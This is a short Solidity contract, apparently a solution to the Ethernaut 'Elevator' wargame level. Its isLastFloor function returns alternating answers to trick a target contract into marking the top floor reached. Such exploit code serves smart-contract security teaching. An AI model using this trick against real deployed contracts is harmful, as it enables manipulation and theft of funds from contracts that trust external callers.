// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract ElevatorAttack is Building {
    Elevator e;
    bool flag = true;

    function attack(address target) public {
        e = Elevator(target);
        e.goTo(0);
    }

    function isLastFloor(uint) external returns (bool) {
        if (flag == true) {
            flag = false;
            return flag;
        }
        else {
            flag = true;
            return flag;
        }
    }
}